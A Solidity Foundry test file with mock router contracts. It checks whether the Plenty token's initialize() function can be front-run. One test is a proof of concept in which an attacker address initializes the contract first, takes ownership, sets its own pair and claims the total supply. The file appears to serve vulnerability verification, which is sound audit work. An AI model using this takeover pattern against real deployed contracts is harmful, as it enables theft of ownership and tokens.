// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Plenty.sol";

contract MockWETH {
    // Minimal implementation for WETH simulation
}

contract MockFactory {
    address public pair;
    
    constructor(address _pair) {
        pair = _pair;
    }
    
    function createPair(address, address) external view returns (address) {
        return pair;
    }
}

contract MockRouter {
    MockFactory public factory;
    address public weth;
    
    constructor(address _weth, address _pair) {
        weth = _weth;
        factory = new MockFactory(_pair);
    }
    
    function WETH() external view returns (address) {
        return weth;
    }
}

contract PlentyInitializationTest is Test {
    Plenty plenty;
    address deployer = address(0x1);
    address attacker = address(0x2);
    address buyBack = address(0x3);
    
    // Mock addresses
    address weth1 = address(0x4);
    address weth2 = address(0x5);
    address pair1 = address(0x6);
    address pair2 = address(0x7);
    
    MockRouter deployerRouter;
    MockRouter attackerRouter;

    function setUp() public {
        // Setup mock routers for different scenarios
        deployerRouter = new MockRouter(weth1, pair1);
        attackerRouter = new MockRouter(weth2, pair2);
    }

    function test_NormalInitialization() public {
        // Deploy contract by legitimate owner
        vm.startPrank(deployer);
        plenty = new Plenty();
        plenty.initialize(address(deployerRouter), buyBack);
        vm.stopPrank();

        // Check that contract initialized properly
        assertEq(plenty.owner(), deployer, "Owner should be deployer");
        assertEq(plenty.uniswapV2Pair(), pair1, "Should use deployer's pair");
    }

    function test_AttackInitialization() public {
        // Deploy contract
        vm.prank(deployer);
        plenty = new Plenty();
        
        console.log("--- BEFORE-Trigger AttackInitialization ---");
        // Record initial contract state
        address ownerPre = plenty.owner();
        address pairPre = plenty.uniswapV2Pair();
        console.log("Pre-attack owner:", ownerPre);
        console.log("Pre-attack uniswapV2Pair:", pairPre);
        
        console.log("--- Trigger AttackInitialization ---");
        // Attacker frontruns deployment
        vm.prank(attacker);
        plenty.initialize(address(attackerRouter), buyBack);
        
        console.log("--- AFTER-Trigger AttackInitialization ---");
        // Record post-attack state
        address ownerPost = plenty.owner();
        address pairPost = plenty.uniswapV2Pair();
        console.log("Post-attack owner:", ownerPost);
        console.log("Post-attack uniswapV2Pair:", pairPost);
        
        // Compare state changes
        bool ownerChanged = (ownerPre != ownerPost);
        bool pairChanged = (pairPre != pairPost);
        console.log("Contract state changes:");
        console.log("- Owner changed:", ownerChanged);
        console.log("- uniswapV2Pair changed:", pairChanged);
        
        // Determine vulnerability existence
        if (ownerChanged && pairChanged) {
            console.log("Vulnerability Exists: Attacker successfully changed owner and uniswapV2Pair");
        } else if (!ownerChanged && !pairChanged) {
            console.log("Vulnerability not Exist: Contract state remains unchanged");
        } else {
            console.log("Vulnerability Partially Exists: Only partial state change occurred");
        }
        
        // Verify final contract state (original test logic)
        assertEq(plenty.owner(), attacker, "Attacker became owner");
        assertEq(plenty.uniswapV2Pair(), pair2, "Attacker set malicious pair");
        assertEq(
            plenty.balanceOf(attacker),
            plenty.totalSupply(),
            "Attacker claimed total supply"
        );
    }

    function test_ReinitializationPrevention() public {
        // Deploy and initialize properly
        vm.startPrank(deployer);
        plenty = new Plenty();
        plenty.initialize(address(deployerRouter), buyBack);
        vm.stopPrank();

        // Attempt malicious reinitialization
        vm.prank(attacker);
        vm.expectRevert("Initializable: contract is already initialized");
        plenty.initialize(address(attackerRouter), buyBack);

        // Ensure original settings remain
        assertEq(plenty.owner(), deployer, "Owner unchanged");
        assertEq(plenty.uniswapV2Pair(), pair1, "Pair unchanged");
    }
}